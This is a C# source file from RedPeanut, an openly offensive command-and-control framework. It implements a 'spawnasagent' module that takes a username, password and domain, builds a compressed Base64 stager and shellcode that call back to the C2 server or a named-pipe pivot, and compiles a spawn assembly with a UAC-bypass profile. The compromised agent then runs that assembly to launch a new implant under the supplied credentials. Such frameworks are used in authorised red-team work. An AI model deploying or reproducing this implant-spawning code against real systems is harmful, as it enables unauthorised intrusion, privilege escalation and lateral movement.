//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using static RedPeanut.Models;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class SpawnAsAgentManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set username", "Set username" },
            { "set password", "Set password" },
            { "set domain", "Set domain" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "spawnasagent";
        string username = "";
        string password = "";
        string domain = "";

        bool exit = false;

        public SpawnAsAgentManager()
        {

        }

        public SpawnAsAgentManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                WmiMenu(input);
            } while (!exit);
        }

        private void WmiMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set username":
                            username = GetParsedSetString(input);
                            break;
                        case "set password":
                            password = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            try
            {
                string host = ((AgentInstanceHttp)agent).GetAddress();
                int port = ((AgentInstanceHttp)agent).GetPort();
                int profileid = ((AgentInstanceHttp)agent).GetProfileid();
                int targetframework = ((AgentInstanceHttp)agent).TargetFramework;
                string pipename = "";

                if (agent.Pivoter != null)
                {
                    host = agent.Pivoter.SysInfo.Ip;
                    port = 0;
                    profileid = RedPeanutC2.server.GetDefaultProfile();
                    targetframework = agent.TargetFramework;
                    pipename = agent.AgentId;
                }
                else
                {
                    host = ((AgentInstanceHttp)agent).GetAddress();
                    port = ((AgentInstanceHttp)agent).GetPort();
                    profileid = ((AgentInstanceHttp)agent).GetProfileid();
                    targetframework = agent.TargetFramework;
                }

                string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profileid))
                {
                    string source;

                    if (string.IsNullOrEmpty(pipename))
                    {
                        //Http no pivot stager
                        ListenerConfig conf = new ListenerConfig("", host, port, Program.GetC2Manager().GetC2Server().GetProfile(profileid), profileid);
                        source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                        source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), targetframework, conf);
                    }
                    else
                    {
                        //NamedPipe enable stager
                        ListenerPivotConfig conf = new ListenerPivotConfig("", host, pipename, Program.GetC2Manager().GetC2Server().GetProfile(profileid));
                        source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                        source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), targetframework, conf);
                    }

                    string stagerstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", targetframework)));

                    ModuleConfig modconfig = new ModuleConfig
                    {
                        Assembly = stagerstr,
                        Method = "Execute",
                        Moduleclass = "RedPeanutRP",
                        Parameters = new string[] { "pippo" }
                    };

                    TaskMsg task = new TaskMsg
                    {
                        TaskType = "module",
                        ModuleTask = modconfig,
                        Agentid = agent.AgentId
                    };

                    if (agent.Pivoter != null)
                        task.AgentPivot = agent.Pivoter.AgentId;

                    source = File.ReadAllText(Path.Combine(folderrpath, SPAWN_TEMPLATE))
                    .Replace("#NUTCLR#", Convert.ToBase64String(CompressGZipAssembly(
                        Builder.GenerateShellcode(stagerstr, RandomAString(10, new Random()) + ".exe", "RedPeanutRP", "Execute", new string[] { "pippo" })
                        ))
                        )
                    .Replace("#SPAWN#", Program.GetC2Manager().GetC2Server().GetProfile(profileid).Spawn)
                    .Replace("#SHELLCODE#", null)
                    .Replace("#USERNAME#", username)
                    .Replace("#PASSWORD#", password)
                    .Replace("#DOMAIN#", domain)
                    .Replace("#PROCESS#", null);

                    string spawnprocess = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", targetframework, compprofile: CompilationProfile.UACBypass)));
                    RunAssemblyBase64(
                        spawnprocess,
                        "RedPeanutSpawn",
                        new string[] { " " },
                        agent);

                }
            }
            catch (Exception)
            {
                Console.WriteLine("[*] Errore generating task");
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "username", username },
                { "password", password },
                { "domain", domain }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
